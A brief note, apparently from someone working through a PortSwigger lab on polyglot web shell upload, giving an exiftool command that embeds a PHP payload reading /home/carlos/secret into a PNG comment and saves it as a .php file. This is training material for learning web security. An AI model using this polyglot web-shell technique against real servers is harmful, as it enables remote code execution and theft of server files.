https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload
 We could use exiftool to rewrite the binary file, the comment flags in this case writes a new value 
 ```sh
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" file.png -o polyglot.php
 ```
 https://exiftool.org/exiftool_pod.html#:~:text=comment